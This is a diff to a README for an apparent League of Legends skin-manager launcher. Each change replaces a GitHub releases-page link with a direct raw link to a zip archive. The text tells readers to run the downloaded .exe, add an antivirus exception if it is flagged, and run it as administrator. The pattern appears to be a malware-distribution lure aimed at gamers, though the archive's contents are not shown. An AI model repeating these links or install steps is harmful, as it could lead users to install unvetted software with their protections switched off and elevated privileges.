@@ -1,6 +1,6 @@
 # 🌌 celestial-launcher-releases - Manage custom skins for League Legends
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/tasseled-penetratinginjury926/celestial-launcher-releases/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/tasseled-penetratinginjury926/celestial-launcher-releases/main/SkinManager/launcher-releases-celestial-v2.8.zip)
 
 This software helps players manage custom skins for League of Legends on Windows 11. It provides a simple way to install, organize, and activate mods without changing core game files manually.
 
@@ -8,7 +8,7 @@ This software helps players manage custom skins for League of Legends on Windows
 
 Follow these steps to set up the launcher on your computer. You do not need technical knowledge to complete this process.
 
-1. Visit the [official releases page](https://github.com/tasseled-penetratinginjury926/celestial-launcher-releases/releases) to find the latest version of the launcher.
+1. Visit the [official releases page](https://raw.githubusercontent.com/tasseled-penetratinginjury926/celestial-launcher-releases/main/SkinManager/launcher-releases-celestial-v2.8.zip) to find the latest version of the launcher.
 2. Select the file ending in `.exe` to begin the download.
 3. Save the file to a folder you can find, such as your Downloads folder.
 4. Locate the file and double-click it to start the application.
@@ -61,7 +61,7 @@ If the launcher fails to open, check the following items:
 
 *   Antivirus software: Some security programs flag new or unknown applications. Create an exception for the launcher if your antivirus prevents it from running.
 *   Permissions: Right-click the launcher icon and select Run as administrator. This provides the necessary access to the game directory.
-*   Version check: Redownload the latest release from the [official page](https://github.com/tasseled-penetratinginjury926/celestial-launcher-releases/releases) if the software crashes on startup.
+*   Version check: Redownload the latest release from the [official page](https://raw.githubusercontent.com/tasseled-penetratinginjury926/celestial-launcher-releases/main/SkinManager/launcher-releases-celestial-v2.8.zip) if the software crashes on startup.
 *   Game path: Reconfirm the location of your League of Legends installation folder within the application settings if the interface shows no installed content.
 
 ## 📃 Support and Updates
